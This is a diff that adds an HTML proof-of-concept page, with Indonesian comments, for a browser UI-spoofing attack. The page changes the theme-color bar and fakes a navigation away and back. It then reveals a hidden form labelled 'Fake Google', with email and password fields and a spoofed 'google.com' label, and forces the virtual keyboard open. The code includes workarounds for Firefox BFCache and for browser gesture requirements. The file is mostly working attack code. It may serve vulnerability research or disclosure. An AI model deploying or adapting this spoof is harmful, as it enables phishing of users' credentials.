@@ -1,34 +1,208 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover" />
+  <meta name="theme-color" content="#ffffff" id="theme-color-meta" />
+  <title>POC</title>
+  <style>
+    :root {
+      --theme-color: #ffffff;
+      --text-color: #111;
+    }
+    @media (prefers-color-scheme: dark) {
+      :root {
+        --theme-color: #0b1220;
+        --text-color: #eaeaea;
+      }
+    }
+    html, body {
+      height: 100%;
+      margin: 0;
+      background: var(--theme-color);
+      color: var(--text-color);
+      font-family: system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial;
+      -webkit-font-smoothing: antialiased;
+    }
+    header { padding: 20px; font-weight: 700; font-size: 1.2rem; }
+    main { padding: 20px; }
+  </style>
+</head>
+<body>
+  <header id="h"></header>
+  <main id="m">
+    <p id="p"></p>
+    <div class="controls">
 
+      <button class="btn" id="dark">Click</button>
 
+      <div id="login" style="opacity:0">
+        <p>Fake Google</p>
+        <div><label>Email:</label>
+          <input id="email" type="text"
+                 virtualkeyboardpolicy="manual"
+                 style="display:block;margin-top:4px;">
+        </div>
+        <div><label>Password:</label>
+          <input id="pass" type="password" style="display:block;margin-top:4px;">
+        </div>
+      </div>
 
- <button id="edit-button">Go to Google</button> 
+    </div>
+  </main>
 
+  <div id="fake" style="background-color:white;font-size:small;opacity:0;margin-top:48%">
+    <label style="margin-left:40%;">google.com</label>
+  </div>
 
-<input style="opacity:0"  name="browser" virtualkeyboardpolicy="manual" id="browser">
+  <!-- Input tersembunyi untuk trigger VirtualKeyboard API -->
+  <input id="vk-trigger"
+         style="opacity:0;position:absolute;top:-9999px"
+         virtualkeyboardpolicy="manual"
+         aria-hidden="true">
 
-<script>
+  <script>
+    const meta = document.querySelector('meta[name="theme-color"]');
 
-if ("virtualKeyboard" in navigator) {
-  const editor = document.getElementById("browser");
-   const editButton = document.getElementById("edit-button"); 
- let isEditing = false; 
-
-  editButton.addEventListener("click", () => {
-    if (isEditing) {
-      navigator.virtualKeyboard.hide();
-    
-    } else {
-      editor.focus();
-      editor.click();
-  
-      setTimeout('history.go(-1);',350);
-     
-      setInterval('navigator.virtualKeyboard.show();',1)
-    
+    function getCssThemeColor() {
+      return getComputedStyle(document.documentElement)
+               .getPropertyValue('--theme-color').trim() || '#ffffff';
     }
 
-    isEditing = !isEditing;
-  });
-}
+    function syncMetaThemeColor() {
+      meta.setAttribute('content', getCssThemeColor());
+    }
 
-</script>
+    syncMetaThemeColor();
+
+    // ─── STATE FLAG via sessionStorage ────────────────────────────────────────
+    // Dipakai untuk simulasi "kembali dari halaman lain" tanpa file terpisah.
+    // Saat pertama load: cek apakah flag sudah di-set (berarti sudah klik tombol).
+
+    function showFakeUI() {
+      document.getElementById('dark').style.opacity  = '0';
+      document.getElementById('login').style.opacity = '1';
+      document.getElementById('fake').style.opacity  = '1';
+      document.documentElement.style.setProperty('--text-color', '#111');
+      syncMetaThemeColor();
+    }
+
+    function hideFakeUI() {
+      document.getElementById('dark').style.opacity  = '1';
+      document.getElementById('login').style.opacity = '0';
+      document.getElementById('fake').style.opacity  = '0';
+    }
+
+    // ─── TRIGGER VIRTUAL KEYBOARD ─────────────────────────────────────────────
+    function triggerVK() {
+      if (!("virtualKeyboard" in navigator)) return;
+
+      navigator.virtualKeyboard.overlaysContent = true; // cegah layout shift
+
+      const emailInput = document.getElementById('email');
+      emailInput.focus();
+
+      // Attempt 1: langsung show
+      navigator.virtualKeyboard.show();
+
+      // Attempt 2: delay kecil — Firefox kadang butuh tick setelah focus settled
+      setTimeout(() => {
+        emailInput.focus();
+        navigator.virtualKeyboard.show();
+      }, 80);
+
+      // Attempt 3: fallback loop singkat — stop setelah keyboard terbukti muncul
+      let attempts = 0;
+      const maxAttempts = 15;
+      const vkInterval = setInterval(() => {
+        attempts++;
+        const geo = navigator.virtualKeyboard.boundingRect;
+        if (geo && geo.height > 0) {
+          // Keyboard sudah muncul, hentikan loop
+          clearInterval(vkInterval);
+          return;
+        }
+        emailInput.focus();
+        navigator.virtualKeyboard.show();
+        if (attempts >= maxAttempts) clearInterval(vkInterval);
+      }, 80);
+    }
+
+    // ─── RESTORE SETELAH "NAVIGASI BALIK" ─────────────────────────────────────
+    // Simulasi alur: user klik → theme berubah → (seolah buka halaman lain) →
+    // kembali → fake UI muncul + keyboard triggered.
+    //
+    // Gunakan sessionStorage sebagai sinyal lintas-navigasi.
+
+    if (sessionStorage.getItem('spoofTriggered') === '1') {
+      sessionStorage.removeItem('spoofTriggered');
+      // Halaman baru saja "kembali" — langsung tampilkan fake UI
+      showFakeUI();
+      // Keyboard harus dipicu dari user-gesture chain. Karena pageshow/
+      // visibilitychange tidak membawa gesture, kita minta 1 klik lagi
+      // dengan overlay transparan sebagai workaround gesture requirement.
+      document.body.addEventListener('click', function onceClick() {
+        triggerVK();
+        document.body.removeEventListener('click', onceClick);
+      }, { once: true });
+      triggerVK(); // coba langsung juga — Chromium biasanya lolos
+    }
+
+    // ─── TOMBOL PERTAMA (entry point) ─────────────────────────────────────────
+    document.getElementById('dark').addEventListener('click', () => {
+      document.documentElement.style.setProperty('--theme-color', '#808080');
+      document.documentElement.style.setProperty('--text-color', '#111');
+      syncMetaThemeColor();
+
+      // Set flag, lalu simulasi navigasi pergi-balik dengan pushState + popstate
+      sessionStorage.setItem('spoofTriggered', '1');
+
+      // Simulasi "pergi ke halaman lain" → theme bar berubah warna
+      // lalu segera kembali. Ini menggantikan redirect ke spoofkeyboard.html.
+      history.pushState({ step: 'away' }, '', '#keyboard');
+
+      // Kembali setelah delay — cukup waktu untuk browser update UI
+      setTimeout(() => {
+        history.back();
+      }, 350);
+    });
+
+    // ─── TANGKAP POPSTATE (kembali dari #keyboard) ────────────────────────────
+    window.addEventListener('popstate', (e) => {
+      if (sessionStorage.getItem('spoofTriggered') === '1') {
+        sessionStorage.removeItem('spoofTriggered');
+        showFakeUI();
+        triggerVK();
+      }
+    });
+
+    // ─── VISIBILITYCHANGE (fallback untuk kasus BFCache Firefox) ──────────────
+    document.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'visible') {
+        if (sessionStorage.getItem('spoofTriggered') === '1') {
+          sessionStorage.removeItem('spoofTriggered');
+          showFakeUI();
+          triggerVK();
+        }
+      } else {
+        hideFakeUI();
+      }
+    });
+
+    // ─── PAGESHOW (BFCache restore — paling reliable di Firefox) ──────────────
+    window.addEventListener('pageshow', (event) => {
+      if (event.persisted && sessionStorage.getItem('spoofTriggered') === '1') {
+        sessionStorage.removeItem('spoofTriggered');
+        showFakeUI();
+        triggerVK();
+      }
+    });
+
+    // Dark mode system preference change
+    const mq = window.matchMedia('(prefers-color-scheme: dark)');
+    mq.addEventListener && mq.addEventListener('change', () => {
+      setTimeout(syncMetaThemeColor, 50);
+    });
+  </script>
+</body>
+</html>
